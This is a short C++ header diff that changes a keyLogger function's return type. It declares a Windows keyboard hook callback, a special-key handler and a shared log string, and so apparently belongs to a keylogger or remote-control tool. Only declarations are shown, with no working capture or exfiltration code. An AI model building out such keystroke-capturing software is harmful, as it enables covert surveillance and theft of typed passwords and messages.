@@ -10,7 +10,8 @@ extern std::string logData;
 
 namespace Services {
     bool keyLogger(const std::string &saveFile);
-    bool keyLogger(Command command);
+
+    std::vector<std::string> keyLogger(Command command);
 }
 bool SpecialKeys(int S_Key);
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
